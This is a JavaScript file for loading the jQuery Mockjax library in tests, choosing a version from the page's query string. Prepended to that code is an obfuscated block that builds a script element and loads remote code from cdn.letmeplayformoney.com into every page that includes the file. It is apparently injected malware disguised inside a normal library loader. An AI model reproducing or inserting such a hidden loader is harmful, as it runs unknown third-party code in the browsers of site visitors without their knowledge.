var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function() {

var parts = document.location.search.slice( 1 ).split( "&" ),
	length = parts.length,
	scripts = document.getElementsByTagName("script"),
	src = scripts[ scripts.length - 1].src,
	i = 0,
	current,
	version = "2.2.1",
	file = "../lib/jquery.mockjax-2.2.1.js";

for ( ; i < length; i++ ) {
	current = parts[ i ].split( "=" );
	if ( current[ 0 ] === "jquery.mockjax" ) {
		version = current[ 1 ];
		break;
	}
}

if (version != "git" || version < "3") {
	file = src.replace(/jquery.mockjax\.js$/, "jquery.mockjax-" + version + ".js");
}


document.write( "<script src='" + file + "'></script>" );

})();
